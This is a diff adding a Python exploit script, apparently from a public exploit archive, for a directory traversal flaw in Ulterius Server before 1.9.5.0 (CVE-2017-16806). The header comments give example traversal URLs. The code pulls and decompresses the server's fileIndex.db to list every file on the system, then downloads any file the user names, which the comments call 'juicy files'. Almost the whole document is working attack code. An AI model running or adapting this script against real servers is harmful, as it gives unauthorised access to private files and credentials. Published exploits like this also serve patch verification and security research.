@@ -1,0 +1,111 @@
+# Exploit Title: Ulterius Server < 1.9.5.0 Directory Traversal Arbitrary File Access
+# Date: 11/13/2017
+# Exploit Author: Rick Osgood
+# Vendor Homepage: https://ulterius.io/
+# Software Link: https://github.com/Ulterius/server/tree/0e4f2113da287aac88a8b4c5f8364a03685d393d
+# Version: < 1.9.5.0
+# Tested on: Windows Server 2012 R2
+# CVE : CVE-2017-16806
+#
+# You can download almost any file that resides on the same drive letter as Ulterius server.
+# Example: http://ulteriusURL:22006/.../.../.../.../.../.../.../.../.../windows/win.ini
+#
+# Unfortunately, you need to know the path to the file you want to download.
+# Fortunately, Ulterius indexes every file on the system, and it's usually stored in the same place:
+# http://ulteriusURL:2206/.../fileIndex.db
+#
+# This script will retrieve the fileIndex.db file for you, decompress it, and process the list to
+# make it human readable. Then you can use the same script to download any juicy files you find.
+#
+# Ulterius writes the following to the fileIndex.db file:
+    # First four bytes are a timestamp so we can ignore this
+# The next four items repeat until the end of the file:
+    # filename.length (4 bytes?)
+    # filename
+    # directory.length (4 bytes?)
+    # directory
+
+import requests
+import sys
+import argparse
+import zlib
+import struct
+
+# This function grabs the filename or file path from the fileIndex
+def processChunk(i, data):
+	length = struct.unpack('B', data[i])[0]
+	length += struct.unpack('B', data[i+1])[0]
+	length += struct.unpack('B', data[i+2])[0]
+	length += struct.unpack('B', data[i+3])[0]
+	
+	i += 4
+	filename = data[i:i+length]
+	i += length
+
+	return i, filename
+
+# Main function
+def main():
+	# Parse arguments
+	parser = argparse.ArgumentParser(description='Ulterius exploit by Rick osgood')
+	parser.add_argument('url', type=str, nargs='+', help='URL of the Ulterius server including port')
+	parser.add_argument('--retrieve', metavar='FILEPATH', type=str, nargs='+', help='Retrieve file from server (e.g. c:\windows\win.ini)')
+	parser.add_argument('--index', help='Retrieve, decompress, and process fileIndex.db (List of all files indexed by Ulterius)', action='store_true')
+	args = parser.parse_args()
+
+        # We are going to retrieve a specified file
+	if args.retrieve:
+		fileName = str(args.retrieve[0])
+		
+                # This works for the default Ulterius install directory.
+		baseDir = "/.../.../.../.../.../.../.../.../.../"
+	
+                # Remove slashes from output file name
+		outFile = fileName.replace('\\','_')
+	
+		# Remove drive letter and change slashes
+		if ":\\" in fileName[:3]:
+			fileName = fileName[3:]
+	
+                # Replace slashes
+		fileName = fileName.replace('\\','/')	# Replace slashes
+	        
+                # Build URL
+		url = str(args.url[0]) + baseDir + fileName
+		print "Retrieving " + url
+	    
+                # Download file
+		r = requests.get(url=url, stream=True)	# Retrieve file
+	
+                # Write file
+		f = open(outFile, 'w')
+		f.write(r.content)
+	
+        # We are going to download the fileIndex.db file
+	if args.index:
+                # Setup the URL
+		url = args.url[0] + "/.../fileIndex.db"
+		print "Downloading " + url
+
+                # Download file
+		r = requests.get(url=url, stream=True)
+		
+                # decompress the data
+                data = zlib.decompress( r.content, -15 )
+		
+                # Open output file for writing
+		f = open('fileIndex.db', 'w')
+	
+		# Strip off header info (not sure what this is)
+		data = data[8:]
+		
+		# Process file names and write to output file
+		i = 0
+		while i < len(data):	
+			i, filename = processChunk(i, data)         # Get file name
+			i, directory = processChunk(i, data)        # Get file path
+			i += 8 # Skip the FFFFFFFFFFFFFFFF
+	    		f.write(directory + '\\' + filename + '\n') # Write to output file
+	
+if __name__ == "__main__":
+    main()
